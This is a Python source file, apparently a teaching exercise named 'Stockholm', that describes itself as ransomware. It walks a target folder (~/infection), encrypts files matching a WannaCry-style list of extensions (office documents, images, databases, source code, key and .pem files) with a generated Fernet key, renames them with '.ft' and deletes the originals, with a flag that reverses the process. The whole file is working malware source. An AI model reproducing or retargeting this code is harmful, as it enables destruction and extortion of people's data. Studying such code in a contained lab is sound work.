
import argparse
import os
from pathlib import Path
from cryptography.fernet import Fernet, InvalidToken

VERSION = "1.0"
KEY_FILE = "key.txt"
TARGET_DIR_NAME = "infection"

WC_EXTENSIONS = [
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff", ".psd",
    ".zip", ".rar", ".tar", ".gz",
    ".sql", ".mdb", ".db", ".dbf", ".py", ".c", ".cpp", ".h", ".java", ".html", ".css", ".js",
    ".pdf", ".txt", ".rtf", ".key", ".pem"
]

def generate_and_save_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

def encrypt_file(file_path, cipher, silent):
    try:
        with open(file_path, "rb") as f:
            content = f.read()
        
        encrypted_content = cipher.encrypt(content)
        
        new_file_path = file_path.with_suffix(file_path.suffix + ".ft")
        
        with open(new_file_path, "wb") as f:
            f.write(encrypted_content)
        
        os.remove(file_path)
        
        if not silent:
            print(f"Encrypted: {file_path}")
            
    except (IOError, PermissionError) as e:
        if not silent:
            print(f"Error processing {file_path}: {e}")

def decrypt_file(file_path, cipher, silent):
    try:
        with open(file_path, "rb") as f:
            encrypted_content = f.read()
        
        decrypted_content = cipher.decrypt(encrypted_content)
        
        original_file_path = file_path.with_suffix('')
        
        with open(original_file_path, "wb") as f:
            f.write(decrypted_content)
            
        os.remove(file_path)
        
        if not silent:
            print(f"Decrypted: {original_file_path}")

    except InvalidToken:
        if not silent:
            print(f"Error: Invalid key for {file_path}. Decryption failed.")
    except (IOError, PermissionError) as e:
        if not silent:
            print(f"Error processing {file_path}: {e}")

def main():
    parser = argparse.ArgumentParser(description="A Ransomware")
    parser.add_argument("-v", "--version", action="version", version=f"Stockholm {VERSION}")
    parser.add_argument("-r", "--reverse", metavar="KEY", help="Reverse the infection using the provided key.")
    parser.add_argument("-s", "--silent", action="store_true", help="Run in silent mode.")
    
    args = parser.parse_args()

    target_dir = Path.home() / TARGET_DIR_NAME
    if not target_dir.is_dir():
        print(f"Error: Target directory '~/{TARGET_DIR_NAME}' not found.")
        return

    if args.reverse:
        try:
            key = args.reverse.encode()
            cipher = Fernet(key)
        except (ValueError, TypeError):
            print("Error: The provided key is not valid.")
            return
        
        files_to_decrypt = [p for p in target_dir.rglob('*') if p.is_file() and p.suffix == '.ft']
        for file_path in files_to_decrypt:
            decrypt_file(file_path, cipher, args.silent)

    else:
        if not args.silent:
            print("Starting encryption process...")
            
        key = generate_and_save_key()
        cipher = Fernet(key)
        
        if not args.silent:
            print(f"A new encryption key has been generated and saved to '{KEY_FILE}'. Keep it safe!")

        files_to_encrypt = [p for p in target_dir.rglob('*') if p.is_file() and p.suffix.lower() in WC_EXTENSIONS and not p.name.endswith('.ft')]
        for file_path in files_to_encrypt:
            encrypt_file(file_path, cipher, args.silent)

if __name__ == "__main__":
    main()
